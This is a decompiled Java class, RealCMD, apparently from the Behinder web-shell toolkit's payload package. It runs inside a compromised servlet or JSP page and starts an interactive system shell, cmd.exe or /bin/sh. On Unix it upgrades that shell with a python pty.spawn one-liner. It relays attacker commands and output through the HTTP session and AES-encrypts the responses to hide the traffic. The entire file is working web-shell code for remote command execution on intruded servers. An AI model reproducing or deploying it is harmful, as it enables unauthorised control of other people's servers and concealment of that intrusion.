// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Iterator;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.IOException;
import java.util.Arrays;
import java.io.Writer;
import java.io.OutputStreamWriter;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.io.BufferedWriter;
import javax.servlet.ServletOutputStream;
import java.util.Map;
import java.util.HashMap;
import javax.servlet.jsp.PageContext;
import javax.servlet.http.HttpSession;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;

public class RealCMD implements Runnable
{
    public static String bashPath;
    public static String type;
    public static String cmd;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    
    public static void main(final String[] args) {
    }
    
    @Override
    public boolean equals(final Object obj) {
        final PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        final Map<String, String> result = new HashMap<String, String>();
        //兼容zcms
        if(Session.getAttribute("payload")!=null){
            Session.removeAttribute("payload");
        }
        try {
            result.put("msg", this.runCmd(page));
            result.put("status", "success");
        }
        catch (Exception e) {
            result.put("status", "fail");
            result.put("msg", e.getMessage());
        }
        try {
            final ServletOutputStream so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }
    
    public RealCMD(final HttpSession session) {
        this.Session = session;
    }
    
    public RealCMD() {
    }
    
    public String runCmd(final PageContext page) throws Exception {
        page.getResponse().setCharacterEncoding("UTF-8");
        String result = "";
        if (RealCMD.type.equals("create")) {
            this.Session.setAttribute("working", (Object)true);
            new Thread(new RealCMD(this.Session)).start();
        }
        else if (RealCMD.type.equals("read")) {
            final StringBuilder output = (StringBuilder)this.Session.getAttribute("output");
            result = output.toString();
        }
        else if (RealCMD.type.equals("write")) {
            final StringBuilder output = (StringBuilder)this.Session.getAttribute("output");
            output.setLength(0);
            final String input = new String(this.base64decode(RealCMD.cmd));
            final BufferedWriter writer = (BufferedWriter)this.Session.getAttribute("writer");
            writer.write(input);
            writer.flush();
            Thread.sleep(100L);
        }
        else if (RealCMD.type.equals("stop")) {
            final Process process = (Process)this.Session.getAttribute("process");
            process.destroy();
        }
        return result;
    }
    
    @Override
    public void run() {
        final Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
        final StringBuilder output = new StringBuilder();
        try {
            final String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder builder;
            if (os.indexOf("windows") >= 0) {
                if (RealCMD.bashPath == null) {
                    RealCMD.bashPath = "c:/windows/system32/cmd.exe";
                }
                builder = new ProcessBuilder(new String[] { RealCMD.bashPath });
            }
            else {
                if (RealCMD.bashPath == null) {
                    RealCMD.bashPath = "/bin/sh";
                }
                builder = new ProcessBuilder(new String[] { RealCMD.bashPath });
            }
            builder.redirectErrorStream(true);
            final Process process = builder.start();
            final OutputStream stdin = process.getOutputStream();
            final InputStream stdout = process.getInputStream();
            final BufferedReader reader = new BufferedReader(new InputStreamReader(stdout, osCharset));
            final BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(stdin));
            this.Session.setAttribute("reader", (Object)reader);
            this.Session.setAttribute("writer", (Object)writer);
            this.Session.setAttribute("output", (Object)output);
            this.Session.setAttribute("process", (Object)process);
            if (os.indexOf("windows") < 0) {
                final String spawn = String.format("python -c 'import pty; pty.spawn(\"%s\")'", RealCMD.bashPath);
                writer.write(spawn + "\n");
                writer.flush();
            }
            final byte[] buffer = new byte[1024];
            int length = 0;
            while ((length = stdout.read(buffer)) > -1) {
                output.append(new String(Arrays.copyOfRange(buffer, 0, length)));
            }
        }
        catch (IOException e) {
            e.printStackTrace();
            output.append(e.getMessage());
        }
    }
    
    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        final String version = System.getProperty("java.version");
        sb.append("{");
        for (final String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    final Class Base64 = Class.forName("java.util.Base64");
                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                }
                else {
                    this.getClass();
                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    final Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
    
    private byte[] base64decode(final String text) throws Exception {
        final String version = System.getProperty("java.version");
        byte[] result = null;
        try {
            if (version.compareTo("1.9") >= 0) {
                this.getClass();
                final Class Base64 = Class.forName("java.util.Base64");
                final Object Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
                result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
            }
            else {
                this.getClass();
                final Class Base64 = Class.forName("sun.misc.BASE64Decoder");
                final Object Decoder = Base64.newInstance();
                result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text);
            }
        }
        catch (Exception ex) {}
        return result;
    }
    
    private byte[] Encrypt(final byte[] bs) throws Exception {
        final Object custmKeyObj = this.Request.getAttribute("parameters");
        final String key = (custmKeyObj!=null&&custmKeyObj instanceof String) ? custmKeyObj.toString():this.Session.getAttribute("u").toString();
        final byte[] raw = key.getBytes("utf-8");
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        final byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
}
